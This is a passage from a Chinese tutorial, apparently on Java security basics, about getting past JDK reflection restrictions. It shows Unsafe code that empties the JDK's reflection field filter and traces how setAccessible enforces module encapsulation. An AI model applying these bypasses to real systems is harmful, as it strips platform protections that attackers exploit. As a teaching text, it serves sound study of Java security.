<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; reflectionClass = Class.forName(<span class="string">&quot;jdk.internal.reflect.Reflection&quot;</span>);</span><br><span class="line"><span class="type">byte</span>[] bytes = reflectionClass.getResourceAsStream(<span class="string">&quot;Reflection.class&quot;</span>).readAllBytes();</span><br><span class="line">Class&lt;?&gt; reflectionAnonymousClass = unsafe.defineAnonymousClass(reflectionClass, bytes, <span class="literal">null</span>);</span><br><span class="line"><span class="type">Field</span> <span class="variable">fieldFilterMap</span> <span class="operator">=</span> reflectionAnonymousClass.getDeclaredField(<span class="string">&quot;fieldFilterMap&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>虽然获取的字段不是原始类的字段，但是我们可以通过这个字段获取到字段的正确偏移，从而通过 <code>Unsafe</code> 修改原始类中对应的字段。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="variable">offset</span> <span class="operator">=</span> unsafe.staticFieldOffset(fieldFilterMap);</span><br><span class="line">unsafe.putObject(reflectionClass, offset, <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;()); <span class="comment">// 把原类的 fieldFilterMap 改成空表</span></span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p>这种通过 <code>Unsafe#defineAnonymousClass</code> 创建匿名副本类的方法在高版本 JDK 失效。</p>
<ul>
<li>虽然 JDK11 把 <code>Unsafe#defineClass</code> 移除了，但 <code>Unsafe#defineAnonymousClass</code> 还在。</li>
<li><code>Unsafe#defineAnonymousClass</code> 在后续的 JDK 版本中被逐步移除：<ul>
<li><strong>JDK 15</strong> ：<code>defineAnonymousClass</code> 方法被弃用，并标记为将在未来版本中移除。</li>
<li><strong>JDK 16</strong> ：该方法被进一步标记为“将来移除”。 </li>
<li><strong>JDK 17</strong> ：<code>defineAnonymousClass</code> 方法被正式移除。</li>
</ul>
</li>
</ul>

    </div>
  </div>

<p>另外如果我们能获取到字段对应的 <code>Field</code> 对象，那么我们同样也可以借助修改 final 变量的思路达到相同效果。</p>
<h3 id="对象字段的读写"><a href="#对象字段的读写" class="headerlink" title="对象字段的读写"></a>对象字段的读写</h3><p><code>Unsafe</code> 提供了多种字段操作方法，涵盖所有 Java 基础类型和对象类型：</p>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td><code>getObject(Object obj, long offset)</code></td>
<td>读取对象类型字段</td>
</tr>
<tr>
<td><code>getInt(Object obj, long offset)</code></td>
<td>读取 <code>int</code> 类型字段</td>
</tr>
<tr>
<td><code>getLong(Object obj, long offset)</code></td>
<td>读取 <code>long</code> 类型字段</td>
</tr>
<tr>
<td><code>getDouble(Object obj, long offset)</code></td>
<td>读取 <code>double</code> 类型字段</td>
</tr>
<tr>
<td><code>getFloat(Object obj, long offset)</code></td>
<td>读取 <code>float</code> 类型字段</td>
</tr>
<tr>
<td><code>getBoolean(Object obj, long offset)</code></td>
<td>读取 <code>boolean</code> 类型字段</td>
</tr>
<tr>
<td><code>getByte(Object obj, long offset)</code></td>
<td>读取 <code>byte</code> 类型字段</td>
</tr>
<tr>
<td><code>getShort(Object obj, long offset)</code></td>
<td>读取 <code>short</code> 类型字段</td>
</tr>
<tr>
<td><code>getChar(Object obj, long offset)</code></td>
<td>读取 <code>char</code> 类型字段</td>
</tr>
<tr>
<td><code>putObject(Object obj, long offset, Object value)</code></td>
<td>写入对象类型字段</td>
</tr>
<tr>
<td><code>putInt(Object obj, long offset, int value)</code></td>
<td>写入 <code>int</code> 类型字段</td>
</tr>
<tr>
<td><code>putLong(Object obj, long offset, long value)</code></td>
<td>写入 <code>long</code> 类型字段</td>
</tr>
<tr>
<td><code>putDouble(Object obj, long offset, double value)</code></td>
<td>写入 <code>double</code> 类型字段</td>
</tr>
<tr>
<td><code>putFloat(Object obj, long offset, float value)</code></td>
<td>写入 <code>float</code> 类型字段</td>
</tr>
<tr>
<td><code>putBoolean(Object obj, long offset, boolean value)</code></td>
<td>写入 <code>boolean</code> 类型字段</td>
</tr>
<tr>
<td><code>putByte(Object obj, long offset, byte value)</code></td>
<td>写入 <code>byte</code> 类型字段</td>
</tr>
<tr>
<td><code>putShort(Object obj, long offset, short value)</code></td>
<td>写入 <code>short</code> 类型字段</td>
</tr>
<tr>
<td><code>putChar(Object obj, long offset, char value)</code></td>
<td>写入 <code>char</code> 类型字段</td>
</tr>
</tbody></table>
<p>这些方法的使用示例如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">unsafe.putInt(user, offset, <span class="number">30</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> unsafe.getInt(user, offset);</span><br><span class="line"></span><br><span class="line">unsafe.putObject(user, offset, <span class="string">&quot;Bob&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">name</span> <span class="operator">=</span> unsafe.getObject(user, offset);</span><br></pre></td></tr></table></figure></div>

<p>在读写字段的时候我们需要向方法中传入字段所在的对象引用。对于于静态字段，静态字段存储在<strong>类的元数据区域</strong>（即<strong>方法区</strong>或<strong>元空间</strong>）中，而不是某个对象实例中，但 <code>Unsafe</code> 操作时，仍然要求传入“对象引用”，这个引用其实是<strong>类的内部静态基地址</strong>。这个地址可以通过 <code>Unsafe.staticFieldBase(Field field)</code> 方法获取。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Object</span> <span class="variable">staticBase</span> <span class="operator">=</span> unsafe.staticFieldBase(field);</span><br><span class="line"><span class="type">long</span> <span class="variable">staticOffset</span> <span class="operator">=</span> unsafe.staticFieldOffset(field);</span><br><span class="line"></span><br><span class="line">unsafe.putObject(staticBase, staticOffset, <span class="string">&quot;NewValue&quot;</span>);</span><br><span class="line"><span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> unsafe.getObject(staticBase, staticOffset);</span><br></pre></td></tr></table></figure></div>

<p>对于数组类型的对象，如果我们要修改其中的成员还需要先调用 <code>arrayBaseOffset</code> 和 <code>arrayIndexScale</code> 方法分别获取数组起始的偏移量和元素大小。然后根据这些信息计算要修改的数组成员的偏移量。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span>[] data = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Unsafe.class.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">field.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Unsafe</span> <span class="variable">unsafe</span> <span class="operator">=</span> (Unsafe) field.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="variable">baseOffset</span> <span class="operator">=</span> unsafe.arrayBaseOffset(data.getClass()); <span class="comment">// 数组起始偏移量</span></span><br><span class="line"><span class="type">int</span> <span class="variable">indexScale</span> <span class="operator">=</span> unsafe.arrayIndexScale(data.getClass()); <span class="comment">// 元素大小</span></span><br><span class="line"><span class="type">long</span> <span class="variable">offset</span> <span class="operator">=</span> baseOffset + indexScale * <span class="number">1</span>;</span><br><span class="line">unsafe.putInt(data, offset, <span class="number">100</span>); <span class="comment">// 更新数组第二个元素</span></span><br><span class="line"><span class="type">int</span> <span class="variable">value</span> <span class="operator">=</span> unsafe.getInt(data, offset); <span class="comment">// 读取</span></span><br></pre></td></tr></table></figure></div>

<h2 id="高版本-JDK-反射绕过"><a href="#高版本-JDK-反射绕过" class="headerlink" title="高版本 JDK 反射绕过"></a>高版本 JDK 反射绕过</h2><p>高版本 JDK 对于反射的限制主要有以下两个方面：</p>
<ul>
<li>限制 <code>setAccessible</code> 导致无法操作获取的被反射对象的成员。</li>
<li>过滤 <code>getDeclaredFields</code> 获取的字段导致部分字段无法通过反射获取。</li>
</ul>
<p>反射的限制以及绕过方法之间的关系如下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/11/Java%20%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/images/Reflection_bypass.svg"
                      alt="Reflection_bypass"
                ></p>
<p><code>getDeclaredMethod</code> 获取 <code>getDeclaredFields0</code> → <code>setAccessible(true)</code>（）</p>
<h3 id="9≤JDK"><a href="#9≤JDK" class="headerlink" title="9≤JDK&lt;12 (setAccessible)"></a>9≤JDK&lt;12 (setAccessible)</h3><p>JDK9 开始针对 <code>checkCanSetAccessible</code> 出现一些限制。</p>
<h4 id="模块化系统"><a href="#模块化系统" class="headerlink" title="模块化系统"></a>模块化系统</h4><p>从 JDK9 开始 Java 引入了<strong>模块化系统（Project Jigsaw）</strong>的概念。</p>
<p>模块化系统（<strong>Project Jigsaw</strong>）是 Java 平台的重要特性之一，旨在改善大型 Java 应用程序的可维护性、可扩展性、性能和安全性。模块化系统将 JDK 本身分解为多个模块，并为开发者提供了一种新的方式来组织、打包和管理 Java 应用。</p>
<p>模块是通过 <code>module-info.java</code> 文件进行声明的，它包含以下几个主要内容：</p>
<ul>
<li><strong>模块名称</strong> ：模块的唯一标识。</li>
<li><strong>导出包（exports）</strong> ：指定哪些包对外部可见。只有通过 <code>exports</code> 声明的包才能被其他模块访问。</li>
<li><strong>需要的模块（requires）</strong> ：声明当前模块依赖的其他模块。如果当前模块依赖某个模块，它就可以访问该模块公开的 <code>exports</code> 包。</li>
<li><strong>开放包（opens）</strong> ：与 <code>exports</code> 类似，但允许通过反射机制访问包中的类和成员。</li>
</ul>
<p><strong><code>module-info.java</code> 示例</strong>：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">module</span> com.example.myapp &#123;</span><br><span class="line">    <span class="keyword">exports</span> com.example.myapp.api;       <span class="comment">// 导出 com.example.myapp.api 包</span></span><br><span class="line">    <span class="keyword">requires</span> java.sql;                  <span class="comment">// 依赖 java.sql 模块</span></span><br><span class="line">    opens com.example.myapp.internal;    <span class="comment">// 允许通过反射访问内部包</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>模块声明一般位于每个模块的根目录下，并且必须命名为 <code>module-info.java</code>。</p>
<p>模块化系统这一机制在一定程度上限制了我们反射操作对象的属性。</p>
<h4 id="限制条件分析"><a href="#限制条件分析" class="headerlink" title="限制条件分析"></a>限制条件分析</h4><p>我们在 JDK9 版本通过反射调用 <code>java.lang.Runtime</code> 的私有构造函数时依然可以成功调用，但是会出现如下警告：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">WARNING: An illegal reflective access operation has occurred</span><br><span class="line">WARNING: Illegal reflective access by com.example.Main (file:/path/to/classes/) to constructor java.lang.Runtime()</span><br><span class="line">WARNING: Please consider reporting this to the maintainers of com.example.Main</span><br><span class="line">WARNING: Use --illegal-access=warn to enable warnings of further illegal reflective access operations</span><br><span class="line">WARNING: All illegal access operations will be denied in a future release</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>因为 <strong>JDK 9</strong> 引入 JPMS（模块化系统）后，出于“<strong>平滑迁移</strong>”的考虑，<strong>默认启用了“放宽的强封装”</strong>：<br>启动器选项 <code>--illegal-access</code> 的默认值是 **<code>permit</code>**。在这个模式下：</p>
<ul>
<li><strong>对“类路径”（unnamed module）上的代码</strong>，JVM 会把 <strong>JDK 8 中就存在的所有包</strong>（例如 <code>java.base/java.lang</code>）临时“打开”给深反射使用，所以你对 <code>java.lang.Runtime</code> 的<strong>私有构造器</strong>仍然能成功调用；</li>
<li>但这是<strong>非法的深反射</strong>，因此<strong>只在第一次</strong>触发时打印一组警告（你看到的那几行），并提示可以用 <code>--illegal-access=warn</code> 对每一次非法访问都报警。</li>
</ul>
<p>JEP 261 对该行为写得很清楚：</p>
<ul>
<li><code>--illegal-access=permit</code>（<strong>JDK 9 默认</strong>）&#x3D; 允许类路径代码对 JDK 8 时代的包做深反射，并<strong>只打印一次</strong>总警告；</li>
<li><code>--illegal-access=warn</code>&#x2F;<code>debug</code> &#x3D; 每次都警告（<code>debug</code> 还带堆栈）；</li>
<li><code>--illegal-access=deny</code> &#x3D; <strong>禁用</strong>所有非法访问（除非你显式用 <code>--add-opens</code> 放开）。</li>
</ul>
<p>这也解释了“为什么能成功但有警告”：<strong>成功</strong>是因为 JDK 9 的默认宽松策略在“给你开小灶”，<strong>警告</strong>是在提醒你这种访问<strong>将来会被拒绝</strong>。</p>
</blockquote>
<p>然而通过 JS 引擎动态加载字节码则会有如下报错，这个报错是因为 <code>java.base</code> 模块并没有开放 <code>java.lang</code> 包给 <code>jdk.scripting.nashorn.scripts</code> 模块。也就是说  JDK9 引入了的模块化系统阻止了这一操作。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Exception in thread &quot;main&quot; java.lang.reflect.InaccessibleObjectException: Unable to make protected final java.lang.Class java.lang.ClassLoader.defineClass(byte[],int,int) throws java.lang.ClassFormatError accessible: module java.base does not &quot;opens java.lang&quot; to module jdk.scripting.nashorn.scripts</span><br><span class="line">    at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:337)</span><br><span class="line">    at java.base/java.lang.reflect.AccessibleObject.checkCanSetAccessible(AccessibleObject.java:281)</span><br><span class="line">    at java.base/java.lang.reflect.Method.checkCanSetAccessible(Method.java:198)</span><br><span class="line">    at java.base/java.lang.reflect.Method.setAccessible(Method.java:192)</span><br><span class="line">    at jdk.scripting.nashorn.scripts/jdk.nashorn.internal.scripts.Script$Recompilation$8$\^eval\_$cu1$restOf.:program(&lt;eval&gt;:1)</span><br><span class="line">    at jdk.scripting.nashorn/jdk.nashorn.internal.runtime.ScriptFunctionData.invoke(ScriptFunctionData.java:652)</span><br><span class="line">    at jdk.scripting.nashorn/jdk.nashorn.internal.runtime.ScriptFunction.invoke(ScriptFunction.java:513)</span><br><span class="line">    at jdk.scripting.nashorn/jdk.nashorn.internal.runtime.ScriptRuntime.apply(ScriptRuntime.java:517)</span><br><span class="line">    at jdk.scripting.nashorn/jdk.nashorn.api.scripting.NashornScriptEngine.evalImpl(NashornScriptEngine.java:448)</span><br><span class="line">    at jdk.scripting.nashorn/jdk.nashorn.api.scripting.NashornScriptEngine.evalImpl(NashornScriptEngine.java:405)</span><br><span class="line">    at jdk.scripting.nashorn/jdk.nashorn.api.scripting.NashornScriptEngine.evalImpl(NashornScriptEngine.java:401)</span><br><span class="line">    at jdk.scripting.nashorn/jdk.nashorn.api.scripting.NashornScriptEngine.eval(NashornScriptEngine.java:154)</span><br><span class="line">    at java.scripting/javax.script.AbstractScriptEngine.eval(AbstractScriptEngine.java:264)</span><br><span class="line">    at com.example.Main.main(Main.java:69)</span><br></pre></td></tr></table></figure></div>

<p>具体分析报错信息可以看到，抛出 <code>InaccessibleObjectException</code> 异常的位置是 <code>java.lang.reflect.AccessibleObject</code> 的 <code>checkCanSetAccessible</code> 函数。并且触发异常的用户代码是 <code>setAccessible</code> 方法的调用。</p>
<blockquote>
<p><strong>因为 <code>--illegal-access=permit</code> 的“迁移豁免”只对</strong>“<strong>类路径上的代码</strong>”（也就是<strong>Unnamed Module</strong>）<strong>生效</strong>。而 Nashorn 把脚本类放进了名为 <strong><code>jdk.scripting.nashorn.scripts</code></strong> 的<strong>动态“命名”模块</strong> ⇒ 不在豁免范围内 ⇒ 被 JPMS 的强封装<strong>直接拒绝</strong>。</p>
</blockquote>
<p><code>Method</code>&#x2F;<code>Constructor</code>（经 <code>Executable</code>）与 <code>Field</code> 都继承自 <code>AccessibleObject</code>。当我们试图通过 <code>setAccessible(true)</code> 或 <code>trySetAccessible()</code> 放开访问限制时，JDK 会调用 <code>AccessibleObject#checkCanSetAccessible</code> 按模块导出&#x2F;开放策略做权限判定；判定通过才允许后续的反射调用或取值。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/11/Java%20%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/images/AccessibleObject.png"
                      alt="AccessibleObject"
                ></p>
<p>在 <code>setAccessible(true)</code> 时，JDK 会调用 <code>checkCanSetAccessible</code> 来判定<strong>调用者</strong>是否被允许为<strong>该反射对象</strong>打开越权访问：</p>
<ul>
<li><p><code>caller</code>：由 <code>Reflection.getCallerClass()</code> 得到的<strong>调用 <code>setAccessible</code> 的类</strong>。</p>
</li>
<li><p><code>declaringClass</code>：<strong>声明该成员的类</strong>（<code>Field/Method/Constructor</code> 的 <code>getDeclaringClass()</code>）。注意它可能是<strong>父类</strong>而非你当前拿到的运行时类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回声明了此方法的类或接口对应的 Class 对象。</span></span><br><span class="line"><span class="comment"> * 换言之，即使你是从子类上拿到这个 Method，只要该方法是从父类或接口继承而来，</span></span><br><span class="line"><span class="comment"> * 这里返回的仍然是最初声明该方法的那个类或接口的 Class。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> Class&lt;?&gt; getDeclaringClass() &#123;</span><br><span class="line">    <span class="keyword">return</span> clazz; <span class="comment">// 持有的“声明者”Class 引用</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>判定依据包括安全管理器权限（如启用）与 JPMS 模块封装&#x2F;<code>opens</code>&#x2F;<code>--add-opens</code> 规则；不满足将抛 <code>InaccessibleObjectException</code>。</p>
</li>
</ul>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将当前反射对象（&#123;<span class="doctag">@link</span> java.lang.reflect.Field Field&#125; /</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> java.lang.reflect.Method Method&#125; /</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> java.lang.reflect.Constructor Constructor&#125;）</span></span><br><span class="line"><span class="comment"> * 的“可访问”标志设置为给定值，用以控制后续反射是否&lt;strong&gt;绕过 Java 语言级别的可见性检查&lt;/strong&gt;</span></span><br><span class="line"><span class="comment"> *（private/protected/包可见等）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;此方法只影响&lt;strong&gt;当前这个反射对象实例&lt;/strong&gt;的访问路径，</span></span><br><span class="line"><span class="comment"> * 并不会改变成员在字节码中的可见性，也不会影响到其他反射对象。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> flag  当为 &#123;<span class="doctag">@code</span> true&#125; 时，尝试允许通过本反射对象跳过语言级访问检查；</span></span><br><span class="line"><span class="comment"> *              当为 &#123;<span class="doctag">@code</span> false&#125; 时，恢复为正常的语言级访问检查。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InaccessibleObjectException</span></span><br><span class="line"><span class="comment"> *         当当前运行环境依据 JPMS（模块化系统）强封装策略判定</span></span><br><span class="line"><span class="comment"> *         &lt;em&gt;不允许&lt;/em&gt;为该成员开启越权访问时抛出（例如目标包未</span></span><br><span class="line"><span class="comment"> *         &#123;<span class="doctag">@code</span> opens&#125; 给调用者模块，也未通过命令行 &#123;<span class="doctag">@code</span> --add-opens&#125; 显式放开）。</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> SecurityException</span></span><br><span class="line"><span class="comment"> *         若启用了安全管理器且调用方未被授予</span></span><br><span class="line"><span class="comment"> *         &#123;<span class="doctag">@code</span> ReflectPermission(&quot;suppressAccessChecks&quot;)&#125; 权限时抛出。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@apiNote</span></span></span><br><span class="line"><span class="comment"> *  - 自 Java 9 起，是否允许“开盖”不仅取决于语言可见性，还受模块封装约束：</span></span><br><span class="line"><span class="comment"> *    &lt;em&gt;公开访问&lt;/em&gt;依赖 &#123;<span class="doctag">@code</span> exports&#125;，&lt;em&gt;深反射&lt;/em&gt;依赖 &#123;<span class="doctag">@code</span> opens&#125;。</span></span><br><span class="line"><span class="comment"> *    典型失败场景需通过 &#123;<span class="doctag">@code</span> --add-opens &lt;module&gt;/&lt;pkg&gt;=&lt;target&gt;&#125; 或在</span></span><br><span class="line"><span class="comment"> *    &#123;<span class="doctag">@code</span> module-info.java&#125; 中 &#123;<span class="doctag">@code</span> opens&#125; 予以放开。</span></span><br><span class="line"><span class="comment"> *  - 对应的“无异常版本”是 &#123;<span class="doctag">@link</span> #trySetAccessible()&#125;：当被拒绝时返回 &#123;<span class="doctag">@code</span> false&#125; 而非抛异常。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@implNote</span></span></span><br><span class="line"><span class="comment"> *  本方法带有 &#123;<span class="doctag">@link</span> CallerSensitive <span class="doctag">@CallerSensitive</span>&#125; 标记，</span></span><br><span class="line"><span class="comment"> *  安全与封装判定以&lt;strong&gt;直接调用者&lt;/strong&gt;为主体。</span></span><br><span class="line"><span class="comment"> *  调用路径中的主体由 &#123;<span class="doctag">@code</span> Reflection.getCallerClass()&#125; 获取。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> #trySetAccessible()</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> #setAccessible(java.lang.reflect.AccessibleObject[], boolean)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.lang.RuntimePermission</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@see</span> java.lang.reflect.ReflectPermission</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@CallerSensitive</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAccessible</span><span class="params">(<span class="type">boolean</span> flag)</span> &#123;</span><br><span class="line">    <span class="comment">// 1) 安全管理器权限检查（若启用）。需要 ReflectPermission(&quot;suppressAccessChecks&quot;)</span></span><br><span class="line">    AccessibleObject.checkPermission();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 只有在要“打开可访问”时才进行深入的模块/封装规则校验；</span></span><br><span class="line">    <span class="comment">//    关闭（flag == false）属于收紧权限，无需额外许可。</span></span><br><span class="line">    <span class="keyword">if</span> (flag) checkCanSetAccessible(Reflection.getCallerClass());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 底层落地：把“可访问”标志写到本反射对象（通常是 native 层的 override 位）。</span></span><br><span class="line">    <span class="comment">//    一旦置 true，通过该对象进行的后续访问将跳过语言级别检查。</span></span><br><span class="line">    setAccessible0(flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 便捷重载：以当前反射对象持有的“声明类”作为判定目标，</span></span><br><span class="line"><span class="comment"> * 检查给定 &#123;<span class="doctag">@code</span> caller&#125; 是否允许为本反射对象开启越权访问。</span></span><br><span class="line"><span class="comment"> * 等价于 &#123;<span class="doctag">@code</span> checkCanSetAccessible(caller, this.getDeclaringClass(), true)&#125;。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> caller  直接调用 &#123;<span class="doctag">@code</span> setAccessible/trySetAccessible&#125; 的类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InaccessibleObjectException  当判定不通过时抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">checkCanSetAccessible</span><span class="params">(Class&lt;?&gt; caller)</span> &#123;</span><br><span class="line">    <span class="comment">// 子类（Field/Method/Constructor）内部通常以 clazz/declaringClass 保存声明类引用</span></span><br><span class="line">    checkCanSetAccessible(caller, clazz);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 便捷重载：等价于</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@code</span> checkCanSetAccessible(caller, declaringClass, true)&#125;。</span></span><br><span class="line"><span class="comment"> * 当判定被拒绝时将抛出 &#123;<span class="doctag">@link</span> InaccessibleObjectException&#125;。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> caller          直接调用者</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> declaringClass  成员的声明类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> InaccessibleObjectException  当判定不通过时抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">void</span> <span class="title function_">checkCanSetAccessible</span><span class="params">(Class&lt;?&gt; caller, Class&lt;?&gt; declaringClass)</span> &#123;</span><br><span class="line">    <span class="comment">// 实际判定委托给带第三参数（是否抛异常）的重载</span></span><br><span class="line">    checkCanSetAccessible(caller, declaringClass, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>最终的核心函数 <code>AccessibleObject#checkCanSetAccessible</code> 用于检测成员是否可以被设置为可访问。</p>
